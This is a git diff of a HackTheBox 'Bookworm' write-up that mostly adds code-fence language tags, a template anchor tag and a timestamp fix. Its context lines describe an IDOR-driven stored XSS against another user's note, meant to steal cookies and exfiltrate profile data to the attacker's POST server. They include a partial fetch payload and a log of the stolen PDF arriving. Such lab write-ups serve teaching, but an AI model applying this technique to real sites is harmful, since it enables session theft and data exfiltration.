@@ -5,6 +5,9 @@ categories: HTB Machine
 tags: SQLI Directory-Traversal Postscript-Injection LFI XSS-Bypass-CSP Symlink File-Bypass
 ---
 
+<a href="{{ post.url | relative_url }}{{ post }}" title="{{ post.title }}">
+
+
 
 ![](/images/bookworm/2024-01-23-15-48-24.png)
 
@@ -70,7 +73,7 @@ secondary account to experiment with.
 I've tried captured our basket's `Edit Note` request in `Burpsuite` reveals a basket identifier in the URI . Look at `POST` request showing id our basket's . We can finding their basket ID and Send payload xss attack to steal victim cookie . To see if we can leverage this information , we add create one more account then we edit the request in `Burpsuite` to point to our secondary accounts basket ID , which allows us to edit secondary accounts note .
 
 
-```
+```javascript
 fetch("http://bookworm.htb/profile", { mode: 'no-cors' })
     .then((response) => response.text())
     .then((text) => {
@@ -89,7 +92,7 @@ fetch("http://bookworm.htb/profile", { mode: 'no-cors' })
 
 I put this code on `test.txt` and i included file path have malicious code javascript to `Edit notes` but `python3 -m http.server` does not support `POST` response so our created code http.server the usage is same but the difference is this code support `POST` request 
 
-```
+```html
 python3 post.py
 Starting server on port 8000
 <...snip...>
@@ -335,7 +338,7 @@ text})
 After a few minutes we have successfully get the file contain pdf
 
 ```
-10.10.11.215 - - [23/Jan//images/bookworm/2024 08:46:53] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan/2024 08:46:53] "POST / HTTP/1.1" 200 -
 %PDF-1.3
 3 0 obj
 <</Type /Page
